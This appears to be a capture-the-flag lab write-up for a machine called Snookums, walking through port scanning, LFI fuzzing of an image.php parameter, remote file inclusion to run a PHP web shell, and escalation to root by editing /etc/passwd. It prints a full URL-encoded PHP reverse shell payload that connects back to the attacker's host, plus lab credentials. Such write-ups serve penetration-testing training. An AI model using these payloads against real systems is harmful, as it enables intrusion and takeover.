Snookums

Target IP: 192.168.182.58

Scanning



There are eight TCP ports open on the target machine. From an aggressive nmap scan, the FTP has a timeout issue. The other useful ports are shown above. I will start enumeration with port 80.

Enumeration

Port 80: HTTP

The webpage above is displayed for this application. Doing a Google search shows this application version is vulnerable to LFI.


Running gobuster dir -u http://192.168.182.58/ -w /usr/share/wordlists/dirb/big.txt -x php,html,txt shows the interesting result above. I find the index.php an interesting file as it shows the image directly on the webpage.


Fuzzing for parameter name shows a parameter called img exists.


Using the command ffuf -u http://192.168.182.58/image.php?img=FUZZ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 1508, I fuzzed for the possible files on the target machine. Using this technique I managed to obtain the /etc/passwd file. From the picture above, there is a user called michael.

Exploitation

I tried to find log files that I could poison, but I had no luck whatsoever. Maybe I can use RFI instead?
Trying to gain a reverse shell connection using RFI did not work as the target host would time out.


My simple web-shell PHP script is shown above. I placed this script inside the directory that I would start a Python server in. Then I started a Python server for the RFI RCE. From previous enumeration I know the following thing:

  • /image.php page has a parameter called img that is vulnerable to LFI.

Now with this information, it's time to perform the exploit.


And now I can perform RFI RCE.In the image above, I used http://192.168.182.58/image.php?img=http://192.168.45.173/shell.php&cmd=id;whoami;ls; to perform RCE. I notice the last command must be ended using ; or %00. I will try to gain a reverse shell connection now. The host is already using a PHP, so I will use a PHP payload too.


And now I have a reverse shell connection. I notice the target machine does not like some ports. I started a listener on port 21 and the target machine connected successfully. I used the payload below. Now I have a foothold on the machine.
PHP payload: php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.173%22%2C21%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
Full URL with payload: http://192.168.182.58/image.php?img=http://192.168.45.173/shell.php&cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.173%22%2C21%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27

Privilege Escalation


During manual enumeration, I found an interesting file called db.php at /var/www/html/. This contains the username root and password MalapropDoffUtilize1337 for the MySQL application.


I gained access to the MySQL application using root:MalapropDoffUtilize1337. The users table contains the entries above. There is only one user that uses the target machine: michael. I copied the base64 password string of michael and decoded it twice to get HockSydneyCertify123.


And it worked! I now have access to michael user.


Game over. Looks like I can edit the /etc/passwd file as the new user.


I created a new root user and switched to this user to gain a root shell.

Flags


The local.txt flag once I obtained michael's password and switched to this user.


The proof.txt flag once I gained a root shell by creating a new user with root privileges.
